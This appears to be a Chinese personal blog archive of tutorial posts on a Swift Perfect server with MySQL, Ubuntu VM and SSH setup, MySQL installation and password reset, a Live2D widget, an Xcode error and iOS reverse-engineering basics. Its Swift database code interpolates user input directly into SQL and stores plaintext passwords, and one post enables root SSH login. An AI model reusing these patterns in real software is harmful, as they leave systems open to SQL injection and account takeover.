.high)]) // 首先增加高优先级的过滤器 server.setResponseFilters([(RequestLogger(), .low)]) // 最后增加低优先级的过滤器 // 项目中根据打印级别打印信息 //LogFile.debug("调试") //LogFile.info("消息") //LogFile.warning("警告") //LogFile.error("出错") //LogFile.critical("严重错误") //LogFile.terminal("服务器终止") &#125;&#125; 处理路由绑定的回调，即当用户触发的对应接口会在这个地方处理，以注册路由绑定的回调为例子： 123456789101112131415//MARK: 处理路由回调extension NetworkServerManager &#123; func registerHanlder() -&gt; RequestHandler &#123; return &#123; request, response in let user = User() user.userName = request.param(name: "userName") user.password = request.param(name: "password") let resultString = UserMediator.creat(a: user) response.setBody(string: resultString) response.completed() &#125; &#125;&#125; 创建一个UserMediator文件作为用户逻辑的中间层，用于管理用户的相关的逻辑，如用户是否重名、参数是否合法，响应数据格式处理等等： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970enum ResponseStatus: String &#123; case success = "Success" case failure = "Failure"&#125;enum ResponseErrorMessage: String &#123; case parameterIncompleteness = "参数不完整" case userExist = "用户已经注册" case userCreationFailed = "用户注册失败" case wrongUsernameOrPassword = "用户名密码错误"&#125;let TableName = "T_User" // 数据库中的用户表class UserMediator &#123; /// 创建成功返回对应的用户信息，不成功返回失败原因 static func creat(a user: User) -&gt; String &#123; guard let userName = user.userName, let password = user.password, userName.count &gt; 0, password.count &gt; 0 else &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.parameterIncompleteness.rawValue, value: []) &#125; // 用户是否存在 let isExist = DataBaseManager.shared.isExist(of: userName, in: TableName) if isExist &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.userExist.rawValue, value: []) &#125; // 创建用户 let isSuccess = DataBaseManager.shared.store(user: user, to: TableName) if !isSuccess &#123; return self.handle(with: .failure, isSuccess: false, message: ResponseErrorMessage.userCreationFailed.rawValue, value: []) &#125; // 是否创建用户成功 let users = DataBaseManager.shared.users(of: userName, in: TableName) return self.handle(with: .success, isSuccess: true, message: nil, value: users) &#125;&#125;extension UserMediator &#123; /// 服务器响应数据处理 /// /// - Parameters: /// - state: 服务器响应结果（实际处理应该为响应结果状态枚举，本处简单的处理为成功/失败） /// - isSuccess: 是否成功的标记 /// - message: 描述信息 /// - value: 响应数据 /// - Returns: 响应数据序列化为json字符串 static func handle(with state: ResponseStatus, isSuccess: Bool, message: String?, value: [[String: Any]]?) -&gt; String &#123; let resultDict: [String : Any] = [ "status" : state.rawValue, "flag" : isSuccess, "message" : message ?? "", "value" : value ?? [] ] do &#123; return try resultDict.jsonEncodedString() &#125; catch &#123; print(error) return "" &#125; &#125;&#125; MySQL数据库 MySQL数据库的安装，请参考之前的文章，本文开头有跳转连接。 创建数据库和表 创建并配置MySQL数据库，本文以Navicat Premium为例子。 打开Navicat Premium软件，点击左上角的连接，选择MySQL，在弹出的窗口中输入对应的信息：如我的连接名称为iNote，其他选项如Host、Port、User Name保持默认，密码即为你的安装的MySQL密码。 配置完服务器信息，就可以创建一个数据库，例如我创建一个名字为iNoteDB的数据库。 在iNoteDB数据库中简单的新建了两张表，一张是用户表T_Users， 一张是笔记表T_Note。表结构如下： 我的字符集选utf-8，排序规则utf8_general_ci。 我们也可以手动在表中插入数据，如我们在用户表中插入一条数据，用户名西门抽血，密码1234567。 数据库管理工具 创建DataBaseManager文件，用户管理数据库的连接、关闭及数据CRUD操作。 数据库的连接配置文件如下： 1234567//MARK: 数据库信息struct MySQLConnector &#123; static let host = "127.0.0.1" static let account = "root" static let password = "1234567" // 之前安装的MySQL服务器的密码 static let database = "iNoteDB" // 刚刚创建的数据库名称&#125; 创建数据库管理者 123456789101112131415class DataBaseManager &#123; /// 单例 全局数据库工具访问点 static let shared = DataBaseManager() private var mysql: MySQL private init() &#123; mysql = MySQL.init() // 创建MySQL对象 let connected = mysql.connect(host: MySQLConnector.host, user: MySQLConnector.account, password: MySQLConnector.password, db: MySQLConnector.database) guard connected else &#123; print("MySQL连接失败" + mysql.errorMessage()) return &#125; &#125;&#125; 操作数据库进行常规的CURD isExist方法 用于查询特定的用户是否存在 store方法 用于缓存一条用户记录到本地 users方法 用于查询特定的一条用户数据记录 Perfect对MySQL的支持还不是很完善，写出来的代码比较丑陋，可以尝试下使用其他的数据或者配套的对象管理函数库（ORM），总的来说支持的服务器种类还是比较完善的，总能找到你中意的一款。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576//MARK: Userextension DataBaseManager &#123; func isExist(of userName: String, in tableName: String) -&gt; Bool &#123; let sql = "SELECT * FROM \(tableName) WHERE userName = '\(userName)'" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return false &#125; // 在当前会话过程中保存查询结果 let resultSets = mysql.storeResults() var resultArray = [[String: String]]() resultSets?.forEachRow(callback: &#123; (row) in let userID = row[0] let userName = row[1] let password = row[2] let created = row[3] let updated = row[4] var dict = [String: String]() dict["userID"] = userID dict["userName"] = userName dict["password"] = password dict["created"] = created dict["updated"] = updated resultArray.append(dict) &#125;) guard let numRows = mysql.storeResults()?.numRows(), numRows &lt;= 0 else &#123; return false &#125; return true &#125; func store(user: User, to tableName: String) -&gt; Bool &#123; guard let userName = user.userName, let pwd = user.password else &#123; return false &#125; let values = "('\(userName)', '\(pwd)')" let sql = "INSERT INTO \(tableName) (userName, password) VALUES \(values))" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return false &#125; return true &#125; func users(of userName: String, in tableName: String) -&gt; [[String: Any]]? &#123; let sql = "SELECT * FROM \(tableName) WHERE userName = '\(userName)'" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return nil &#125; // 在当前会话过程中保存查询结果 let resultSets = mysql.storeResults() var resultArray = [[String: String]]() resultSets?.forEachRow(callback: &#123; (row) in let userID = row[0] let userName = row[1] let password = row[2] let created = row[3] let updated = row[4] var dict = [String: String]() dict["userID"] = userID dict["userName"] = userName dict["password"] = password dict["created"] = created dict["updated"] = updated resultArray.append(dict) &#125;) return resultArray &#125;&#125; 启动及测试服务器 在程序入口Main.swift文件配置启动服务器，因为上面我们已经在服务器管理者这个文件中封装好了启动方法，此时就可以一行搞定： 12// 启动服务器NetworkServerManager.shared.serverStart() 运行项目，等待控制台输出如下信息代表启动服务器成功，然后测试注册服务器接口了，以post请求的注册接口为例子： 我们这里使用Paw工具测试网络接口，当然你们也可以使用Post Man测试，甚至你想的话可以自己写网络接口调用测试。 如果是get请求，你可以直接在浏览器就可以测试，如果你想改下本例子的请求方式，只需要在路由配置方法中把.get改为.post即可。 1[INFO] Starting HTTP server on 0.0.0.0:8181 例如我们测试，用户名西门抽血，密码1234567进行注册，因为之前我们在数据库中手动添加了一条相同记录，所以注册结果如下图：接口调用成功，服务器返回注册失败信息。 结尾 本文只是对使用Perfect搭建服务器的一个概要性总结，希望大家通过本文可以对Swift开发服务器整个流程有一个认识，具体的细节和注意点都待完善。 至于项目Demo，肯定是有的，但是目前是不可能给到大家了，因为我还没有写完啊，目前只是写了一个粗略的注册接口，并且逻辑还没写完😂。 其实项目的完善部分就集中在接口响应处理的对服务器CRUD部分了，因为使用Mysql服务器用的很不顺手，可能会换用其他比较完善的数据库再完善这一部分。 等服务端写完，在开坑对应的客户端，客户端就不用说了，大家估计都快写吐了😂。至于什么时候能写完，我自己都不知道，毕竟我这么懒🌚🌝！ 参考官方文档Perfect官方文档在这里Swift官方文档Swift包管理器.服务端指南 | 良好的 API 设计指南服务端写Swift体验 (Perfect框架)Swift3.0服务端开发(一) 完整示例概述及Perfect环境搭建与配置（服务端+iOS端）]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Swift</tag>
        <tag>Perfect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swift开发服务端（二）：使用Parallels Desktop虚拟机安装Ubuntu系统及相关配置]]></title>
    <url>%2Farchives%2F64bb63f1.html</url>
    <content type="text"><![CDATA[故乡是一个人的羞涩处，也是一个人最大的隐秘。我把故乡隐藏在身后，单枪匹马去闯荡生活。我在世界的任何一个地方走动，居住和生活，那不是我的，我不会留下脚印。 ——刘亮程《一个人的村庄》 简介 Swift对Mac的原生支持就不用多说了，虽然是开源编程语言，但是有她亲爹苹果在后面支持，能不原生支持苹果系统🌝？ 好消息是Swift开源后支持Linux，我们可以在Linux上面使用Swift配置环境，编写、编译、部署服务器了。 本文将介绍如何通过使用Parallels Desktop虚拟机（以下简称PD），在Mac系统下安装Ubuntu系统级注意点。 当然、你也可以直接安装一个Linux系统，或者在其他电脑安装Linux系统，全凭个人爱好。 Swift开发服务端（一）：MySQL安装及配置 正文 PD是一款相当强大且好用的虚拟机，可以安装Android、Mac、windows、以及比较常用的Linux系统（至于如何获取该软件，自己看着办😂）。 PD已经集成了上面系统的下载安装功能。如果你的网速比较快、而且磁盘空间也比较充裕的情况下，强烈推荐使用这种方式安装，完全适合像我这种比较懒的人。 当然了，我是通过单独下载安装包的方式安装的，你问我为什么？当然是因为这样显得逼格比较高啊🌚。 好吧，肯定很多小伙伴不相信，其实我自己都不相信emmm，主要是因为我使用公司的iMac、系统盘是后来加的SSD，容量没有多少了，所以只能手动安装到原来的1T机械硬盘里面了。 安装自动下载安装 打开PD,选择需要安装的Linux，点击下一步： 点击下载按钮开始下载安装，没什么需要说的： 手动安装下载Ubuntu安装包 在Ubuntu downloads下载安装包。 有桌面版和服务器版本，桌面版会比服务器版安装包大一些，多了一些界面元素。服务器版偏向于命令行操作，如何选择看个人爱好。 我是想顺便体验下Ubuntu系统，所以安装的是16.04的桌面版。 安装 打开PD,选择通过镜像文件安装，点击下一步： 可以手动选择文件路径，也可以将下载的安装包拖拽到当前的PD窗口放手就可以： 完成后选择需要安装的镜像文件，继续下一步，输入账号密码： 选择安装名称以及安装目录： 之后跟着提示一路确定就可以安装成功，进入登录界面，输入密码进入系统（我这里显示效果已经优化过，你安装完可能和我的有一些细微的差别，具体设置在下面）： 虚拟机设置 如果有需要对虚拟机重新配置一些参数、如磁盘大小、内存大小、键盘、网络等等、都可以通过虚拟机窗口右上角的设置选项重新配置。 也可以在虚拟机菜单里面找到该设置选项。 所有修改都需要重新启动虚拟机才可以生效。 优化配置Ubuntu全屏设置 默认安装完成后，Ubuntu窗口是无法适配全屏的，看着很难受。需要手动安装Parallels Tools。 点击PD虚拟机的窗口右上角的黄色感叹号（第一次安装会有），或者从菜单选择Install Parallels Tools，然后根据提示一步步操作即可。 如果安装不成功，可以手动安装 打开Ubuntu的 Terminal （快捷键：Ctrl + Option + T）. 切换到系统管理员权限: 1sudo su // or su 确保虚拟机的DVD驱动已经退出 1eject /dev/cdrom 选择PD菜单 &gt; Devices &gt; CD/DVD &gt; Connect image，选择 /Applications/Parallels Desktop/Contents/Resources/Tools目录下的prl-tools-lin.iso文件. 挂载Parallels Tools镜像到Linux虚拟机: 12mkdir /media/cdrommount /dev/cdrom /media/cdrom 检查镜像是否被成功挂载 1234ls /media/cdrom// 输出信息install* installer/ install-gui* kmods/ tools/ version 进入到镜像文件目录下，执行安装包： 12cd /media/cdrom./install Ubuntu分辨率 安装完成Parallels Tools后，系统的分辨率默认是Mac系统的最高分辨率，我的iMac分辨率是4K，导致显示内容被缩放的特别小，非常难受。 更难受的是默认无法更改分辨率，本着有条件要上，没条件创造条件也要上的原则，找到了修改分辨率的方法： 打开终端输入xrandr查看系统支持的分辨率，*标识正在使用的分辨率： 打开系统诊断框，将可以选择勾选一些调试选项，也可以什么也不做，命令如下： 1sudo xdiagnose 点击应用，关闭诊断窗口 修改完成后需要重新启动虚拟机，可以在虚拟机菜单栏点击重启选项，也可以使用如下命令： 1sudo reboot 打开Ubuntu系统的设置菜单，进入显示设置，此时里面已经可以设置不同的分辨率了。但是我发现可以直接使用最高的分辨率，只需要修改菜单和标题缩放比例就可以使整个界面很干净通透的显示效果了。 系统文件修复 由于Mac系统（突然断电或死机或未正常关闭）关闭或者虚拟机非正常关闭都可能会导致磁盘检测不能通过，无法正常进入Ubuntu系统： 123456789101112dev/sda1: Inodes that were part of a corrupted orphan linked list found./dev/sda1: UNEXPECTED INCONSISTENCY:; RUN fsck MANUALLY (i.e., without -a or -p options)fsck exited with status code 4The root filesystem on /dev/sda1 requires a manual fsckmodprobe: module ehci-orion not found in modules.depBusyBox v1.22.1 (Debian 1:1.22.0-9+deb8u1) built-in shell (ash)Enter 'help' for a list of built-in commands./bin/sh: can't access tty; job control turned off(initramfs) _ 解决方法：输入下面指令后，按照提示一路回车（yes）操作后，会自动重启即可解决 1(initramfs) fsck -c /dev/sda1 // 修复对象取决于出错的对象，可以是一块磁盘或者一个VG root权限 sudo + 命令，输入当前用户密码后以root权限执行命令，有时间限制且仅限当前命令。 sudo -i，输入当前用户密码后以root权限登录shell，无时间限制。使用exit或logout退出。 su，输入root账户的密码后切换到root身份，无时间限制。su用户名切换回其它用户。 sudo su，效果同su，只是不需要root的密码，而需要当前用户的密码。 设置root密码 Ubuntu的默认root密码是随机的，即每次开机都有一个新的root密码。 如果需要设置root用户密码，命令如下： 会需要输入默认用户密码 设置root用户密码 确认root用户密码 1sudo passwd root 修改成功后，需要root权限，执行su root命令，输入root密码就可以了。 其他问题VIM方向键及删除键 系统默认自带的vim方向键不能和Mac下一样自如的切换光标位置，会变成ABCD，而且删除键也失效。 解决方法： 更新系统的包管理工具，apt-get是Linux自带的包管理工具，类似于Mac系统的homebrew. 1sudo apt-get update 移除系统自带的vim 1sudo apt-get remove vim-common 下载安装新的vim 1sudo apt-get install vim 更多vim相关的知识传送门 ssh远程连接 因为我们需要直接在本地电脑远程访问服务器如我们的虚拟机Ubuntu系统、传输文件等，此时就需要开启ssh服务，linux不同于Mac系统，默认是没有安装ssh服务的，需要我们自行下载安装。 安装ssh服务，命令如下： 1sudo apt-get install openssh-server 确认ssh-server是否启动 如果存在ssh-agent和sshd说明已经开启成功 1ps -e | grep ssh 如果没有sshd，需要手动启动 1sudo /etc/init.d/ssh start ssh-server默认端口是22，可以通过SSH配置文件更改包括端口、是否允许root登录等设置, 配置文件目录如下，修改完成重启ssh-server即可。 12345678// 配置文件目录/etc/ssh/sshd_config// 可通过vim修改sudo vi /etc/ssh/sshd_config// 重启sudo /etc/init.d/ssh restart 关于更多ssh远程连接以及远程scp文件传输，可以参考之前写的这篇文章的SSH部分 远程登录报错 在本地远程登录linux 服务器系统时，提示Permission denied, please try again. 。 原因：ssh服务默认没有开root用户的ssh权限。所以远程登录时默认下root用户是没有权限的。 解决方法：要修改root的ssh权限 将/etc/ssh/sshd_config文件中PermitRootLogin prohibit-password注释掉（前面加#号）。 添加 PermitRootLogin Yes 1sudo vi /etc/ssh/sshd_config 显示隐藏文件 若使用桌面可视化窗口，进入该待显示的文件目录，快捷键ctrl + h则显示隐藏文件。 若使用命令行，则使用命令：ls -a显示所有文件，也包括隐藏文件。 参考 Parallels Tools manual installation in Linux virtual machine Mac使用parallels desktop安装 ubuntu 分辨率问题]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Swift</tag>
        <tag>Linux</tag>
        <tag>Parallels Desktop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swift开发服务端（一）：MySQL安装及配置]]></title>
    <url>%2Farchives%2F6efe8aae.html</url>
    <content type="text"><![CDATA[经过许多个冬天之后，我才渐渐明白自己再躲不过雪，无论我蜷缩在屋子里，还是远在冬天的另一个地方，纷纷扬扬的雪，都会落在我正经历的一段岁月里。当一个人的岁月像荒野一样敞开时，他便无法照管好自己，落在一个人一生中的雪，我们不能全部看见，每个人都在自己的生命中，孤独地过冬。 ——刘亮程《寒风吹彻》 简介 最近想重新折腾一下Swift的服务端开发，为什么说是重新折腾呢？因为我在年初（大概是1月份）的时候就已经折腾过了，照着别人的教程体验了一下Swift开发服务端，使用的是加拿大的一个开发小组孵化的开源服务端框架Perfect。 但是，体验完就尘封了，一如之前的Swift学习，间歇性的😂。而且那时候还没真正用Swift开发过项目，所以对一些Swift的高级语法和特性还不是很熟悉，所以，这个锅是Swift的，我不背🌚🌚。 最近突然想换体验一下其他端的开发思路，嗯、是的，很突然🌝。所以就想把一些学习记录和踩坑过程记录下来。 因为我之前已经安装过Mac端的MySQL，但是还是想在这里总结记录一下。 正文 MySQL安装可以直接去官网下载安装包下载，也可以使用homebrew安装，但是我实在是记不起我之前是用哪一种方式安装的了。不过，鉴于我这么懒，应该是使用的homebrew🤣🤪。 但是这里、两种安装方式我都会介绍。 手动安装下载安装MySQL 首先去MySQL官网下载安装包。 截止目前最新版本是MySQL Community Server 8.0.12，但是后面使用Perfect开发的时候，8.0.12会出现问题，所以推荐使用5.7.23 下载5.7.23版本步骤如下： 下载完成后，双击打开进行安装，按步骤一步一步的安装即可。 注意最后一步，会有一个弹框，里面有默认生成的随机密码，记得保存，后面会用到。 密码在：root@localhost:xxxxxxxx 查看是否安装成功 打开系统偏好设置，最下面会出现MySQL图标 开启MySQL服务 在终端查看MySQL版本 12345// cmdmysql --version// messagemysql Ver 14.14 Distrib 5.7.21, for osx10.12 (x86_64) using EditLine wrapper MySQL配置 &amp; 登录系统环境变量配置 进入cd /usr/local/mysql/bin目录 执行 ls -l，查看是否存在mysql文件。 使用vim编辑bash_profile文件，命令：vim ~/.bash_profile。 在该文件中添加mysql/bin的目录，按i进入编辑模式，加入如下内容： 1export PATH=$&#123;PATH&#125;:/usr/local/mysql/bin 添加完成后，按esc退出编辑模式，然后输入 :wq保存并退出vim 执行这个文件，使新添加的环境变量有效，命令如下： 1source ~/.bash_profile 登录MySQL 参考上面步骤，进入系统偏好设置，开启MySQL服务 终端执行mysql -uroot -p指令，会提示输入密码，密码就是安装是保存的密码，输入即可。 一切顺利就可以登录成功了。 通过Homebrew安装 使用homebrew安装就更简单了，懒人必备，安装homebrew参考这里。 安装mysql 1brew install mysql 安装完成查看版本 12345// cmdmysql --version// messagemysql Ver 14.14 Distrib 5.7.21, for osx10.12 (x86_64) using EditLine wrapper 开启mysql服务 1mysql.server start 安装完root用户默认没有密码，需要配置root用户密码提高安全性。 设置root用户密码 删除匿名账号 取消root用户远程登录 删除test库和对test库的访问权限 刷新授权表使修改生效 12// 安装安全配置向导mysql_secure_installation 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364Securing the MySQL server deployment.Connecting to MySQL using a blank password.VALIDATE PASSWORD PLUGIN can be used to test passwordsand improve security. It checks the strength of passwordand allows the users to set only those passwords which aresecure enough. Would you like to setup VALIDATE PASSWORD plugin?Press y|Y for Yes, any other key for No: yThere are three levels of password validation policy: // 密码安全策略LOW Length &gt;= 8MEDIUM Length &gt;= 8, numeric, mixed case, and special charactersSTRONG Length &gt;= 8, numeric, mixed case, special characters and dictionary filePlease enter 0 = LOW, 1 = MEDIUM and 2 = STRONG: 0Please set the password for root here.New password: // Root用户密码Re-enter new password: // 确认Root用户密码Estimated strength of the password: 50 Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) : yBy default, a MySQL installation has an anonymous user,allowing anyone to log into MySQL without having to havea user account created for them. This is intended only fortesting, and to make the installation go a bit smoother.You should remove them before moving into a productionenvironment.Remove anonymous users? (Press y|Y for Yes, any other key for No) : ySuccess.Normally, root should only be allowed to connect from'localhost'. This ensures that someone cannot guess atthe root password from the network.Disallow root login remotely? (Press y|Y for Yes, any other key for No) : ySuccess.By default, MySQL comes with a database named 'test' thatanyone can access. This is also intended only for testing,and should be removed before moving into a productionenvironment.Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y - Dropping test database...Success. - Removing privileges on test database...Success.Reloading the privilege tables will ensure that all changesmade so far will take effect immediately.Reload privilege tables now? (Press y|Y for Yes, any other key for No) : ySuccess.All done! 登录mysql 1mysql -uroot 修改MySQL密码 安装生成的密码是随机生成的字符串，我连自己设置的密码都记不住了，还TM记这个密码🌚。 如果记得初始密码 如果还没有忘记初始密码，那么恭喜你，修改很简单。 执行mysql -uroot -p指令，输入默认密码登录MySQL。 newPassword为新密码，直接修改即可。 1SET PASSWORD FOR 'root'@'localhost' = PASSWORD('newPassword'); 如果忘记初始密码 修改密码步骤如下： 关闭mysql服务，可以在系统偏好设置关闭，也可以在终端执行如下命令： 1sudo /usr/local/mysql/support-files/mysql.server start 进入mysql目录 1cd /usr/local/mysql/bin/ 获取管理员权限 1sudo su 禁止mysql验证功能，mysql会自动重启，偏好设置中的mysql状态会变成running 1./mysqld_safe --skip-grant-tables &amp; 新开一个终端窗口，进入mysql目录 1cd /usr/local/mysql/bin/ 输入如下两个指令执行并刷新 12./mysqlflush privileges; // 分号不要忘了 修改新密码 1set password for 'root'@'localhost' = password('newPassword'); 参考 Assigning Account Passwords]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Swift</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Hexo博客加载Live2D动画模型挂件]]></title>
    <url>%2Farchives%2Fcb206c67.html</url>
    <content type="text"><![CDATA[许多年之后你再看，骑快马飞奔的人和坐在牛背上慢悠悠赶路的人，一样老态龙钟回到村庄里，他们衰老的速度是一样的。时间才不管谁跑得多快多慢呢。 ——刘亮程《一个人的村庄》 简介 最近有几位博友问我关于Hexo博客加载动画挂件的问题，他（她）们可能是由于不知道这个功能是用Live2D实现的，要不然随便网上一搜、教程可能一大把。 既然有这么小伙伴问，那么存在就是合理的、所以就单独写一篇文章简单介绍一下怎么实现这个功能。 本文基于Hexo博客的Next主题（其他主题也都大同小异，可以参考）。 Live2D的工作原理是通过将一系列的2D图像进行平移、旋转和变形等操作，生成一个具有自然动画效果的可动人物模型。由于Live2D只需一系列2D原图即可生成具有类似于3D动画效果的模型，比3D建模耗费的时间和成本更少，因此受到很多游戏制作者，特别是小成本AVG和手游作者的喜爱。另外，Live2D生成的模型相对于真正的3D模型，可以更好地还原手绘风格。Live2D生成的模型并不是真正的3D模型，因此具有一些局限性，比如无法进行大幅度的转身动作。但是貌似Live2D Euclid可以达到这一效果。 安装 &amp; 部署安装Live2D模块 使用如下指令安装Live2D模块、注意需要在博客的根目录通过终端执行 1npm install --save hexo-helper-live2d 如果不想使用、想彻底卸载，命令如下： 1npm uninstall hexo-helper-live2d 安装完成之后，就会在博客的根目录package.json文件中存在依赖 在博客根目录的node_moduels文件夹下可以看到安装的Live2D模块 了解更多可参考github 和 官网 配置喜欢的动画模型 有非常多的Live2D动画模型供我们选择： 动画模型效果可以参考这里 对应的模块下载在这里 如我使用的是tororo，可以直接在上面的下载界面: 手动下载完成之后将packages里面的所有文件拷贝到博客根目录的node_moduels文件夹下。 也可以使用包管理器安装，命令格式：npm install 模型的包名，也会安装在node_moduels目录下。 配置博客的站点文件 打开博客根目录的配置文件_config.yml，添加如下内容： 12345678910111213141516171819202122# Live2D## https://github.com/xiazeyu/live2d-widget.js## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-initlive2d: model: scale: 1 hHeadPos: 0.5 vHeadPos: 0.618 use: live2d-widget-model-tororo // 下载的动画模型名称 display: superSample: 2 width: 120 height: 200 position: left // 模型在网页显示位置 hOffset: 20 vOffset: 50 mobile: show: true // 移动设备是否显示 scale: 0.5 react: opacityDefault: 0.7 opacityOnHover: 0.2 部署到网站 所有工作完成之后，就可以在自己的网站部署并显示出来了。 清空一下本地缓存hexo clean 生成博客的文件 hexo g 成功后就可以在终端看到有如下信息： 将文件提交到GitHub仓库并开始部署hexo d，至此刷新你的网站，就可以在文章页面看到你配置的Live2D动画挂件了。 发布自己的Live2D模型包 如果你想发布自己的Live2D动画模型包，可以参考如下步骤： 新建一个目录, 用Node环境执行 npm init, 包名推荐格式如：live2d-widget-model-xxx。 在刚刚创建的目录下创建 assets 子目录, 把你的模型文件放进去. 执行 npm publish 命令来发布. 此时就使用 npm install --save live2d-widget-model-xxx 来安装自定义的模型包了。 安装完成后就可以在配置文件_config.yml中 model.use 修改包名来使用了. 参考 github 官网]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>Hexo</tag>
        <tag>live2D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之Xcode10 Beta3升级Beta4编译错误]]></title>
    <url>%2Farchives%2Ffeadc9a.html</url>
    <content type="text"><![CDATA[我只愿蓬勃生活在此时此刻，无所谓去哪，无所谓见谁。那些我将要去的地方，都是我从未谋面的故乡。以前是以前，现在是现在。我不能选择怎么生，怎么死；但我能决定怎么爱，怎么活。 ——王小波《黄金时代》 简介 今天升级了下Xcode10的最新测试版本，突然正在进行的项目无法编译了，这可真是日了🐶了。 我刚开是以为是我项目改动出问题了， 然后切到Xcode9，编译，成功通过。 再切换到Xcode10，将编译器（Xcode10默认为新编译器）切换为旧版本编译器，编译，成功通过。 将编译器切换为新编译器清空编译缓存，清理项目缓存，依然无法通过。 只要切换到Xcode10的新编译器就报错error: unable to open dependencies file xxx，猜测应该是新的编译器依赖检测引起的。 问题 &amp; 解决编译错误如下1unable to open dependencies file (/Users/sevencho/Library/Developer/Xcode/DerivedData/KYPetNearby-aslcxdeqowvpemcspggokzrpkzcp/Build/Intermediates.noindex/Pods.build/Debug-iphonesimulator/Pods-KYPetNearby.build/SwiftStdLibToolInputDependencies.dep) 尝试解决 首先确定代码没有问题后，根据错误信息是在这个Pods-KYPetNearby.build文件里面出现，猜测可能是新开发工具的新编译器在检测CocoaPods导致的问题。 尝试1： 移除所有已经Pod install安装的库，清空项目缓存 重新Pod install安装需要的库 重新编译项目，依然是出现相同的错误 尝试2： 清空项目缓存 Pod update更新所有安装的库 重新编译项目，依然是出现相同的错误 尝试3：（猜测可能是CocoaPods版本问题） 清空项目缓存 更新CocoaPods 12sudo gem update --systemsudo gem install cocoapods -n/usr/local/bin 更新所有安装的库 1pod update 重新编译项目，世界恢复和平了。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Xcode10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS逆向笔记（二）：iOS二进制文件类型]]></title>
    <url>%2Farchives%2Fc7624e77.html</url>
    <content type="text"><![CDATA[人活在世界上，快乐和痛苦本就分不清。所以我只求它货真价实。 ——王小波 《革命时期的爱情》 iOS二进制文件类型 在iOS逆向工程初学阶段，我们的目标主要是Application、Dynamic Library（以下简称dylib）和Daemon这三类二进制文件，对它们的了解越深入，逆向工程就会越顺利。这三类文件分工不同，其目录结构和文件权限也有一些区别。 Application Application就是我们最熟悉的App了。虽然对于大多数iOS开发者来说，工作都是在跟App打交道，但在iOS逆向工程中，关注App的侧重点与正向开发还是不尽相同的。了解下面的几个App相关概念，是开始逆向工程前的必备工作。 bundle bundle的概念来源于NeXTSTEP，它不是一个文件，而是一个按某种标准结构来组织的目录，其中包含了二进制文件及运行所需的资源。正向开发中常见的App和framework都是以bundle的形式存在的；在越狱iOS中常见的PreferenceBundle，可以看成是一种依附于Settings的App，结构与App类似，本质也是bundle。 Framework也是bundle，但framework的bundle中存放的是一个dylib，而不是可执行文件。相对来说，framework的地位比App更高，因为一个App的绝大多数功能都是通过调用framework提供的接口来实现的。将某个bundle确立为逆向目标后，绝大多数逆向线索都可以在bundle内找到，这大大降低了逆向工程的复杂度。 App目录结构 在iOS逆向工程中，对App目录结构的熟悉程度是决定工作效率的重要因素。App目录的以下三个部分比较重要。 Info.plist Info.plist记录了App的基本信息，如bundle identifier、可执行文件名、图标文件名等。可以通过Xcode查看它的值，也可以通过Xcode自带的命令行工具plutil查看它的值，如下： 123plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/Info.plist | grep CFBundleIdentifier&quot;CFBundleIdentifier&quot; =&gt; &quot;com.apple.SiriViewService&quot; 可执行文件 可执行文件的重要性不言而喻，它是App目录下最核心的部分，也是逆向工程最主要的目标。同样可以通过Xcode和plutil两种方式来查看Info.plist，定位可执行文件。用Xcode查看Info.plist的界面，也可以通过Xcode自带的命令行工具plutil查看它的值，如下： 12snakeninny$ plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/Info.plist| grep CFBundleExecutable&quot;CFBundleExecutable&quot; =&gt; &quot;SiriViewService&quot; lproj目录 lproj目录下存放的是各种本地化的字符串（.strings），是iOS逆向工程的重要线索，也可以用plutil查看，如下： 12345678910 plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/en.lproj/Localizable.strings&#123; &quot;ASSISTANT_INITIAL_QUERY_IPAD&quot; =&gt; &quot;What can I help youwith?&quot; &quot;ASSISTANT_BOREALIS_EDUCATION_SUBHEADER_IPAD&quot; =&gt; &quot;Justsay &quot;Hey Siri&quot; to learn more.&quot; &quot;ASSISTANT_FIRST_UNLOCK_SUBTITLE_FORMAT&quot; =&gt; &quot;Yourpasscode is required when %@ restarts&quot;…… 系统App VS StoreApp /Applications/目录存放系统App和从Cydia下载的App（我们把来自Cydia的App视为系统App），而/var/mobile/Containers/目录存放的则是StoreApp。虽然两者都是App，但它们在如下方面存在着一些差别。 目录结构 两种App的bundle内部目录结构区别不大，都含有Info.plist、可执行文件、lproj目录等，但是数据目录的位置不同：StoreApp的数据目录在/var/mobile/Containers/Data/下，以mobile权限运行的系统App的数据目录在/var/mobile/下，而以root权限运行的系统App的数据目录在/var/root/下。 安装包格式与权限 Cydia 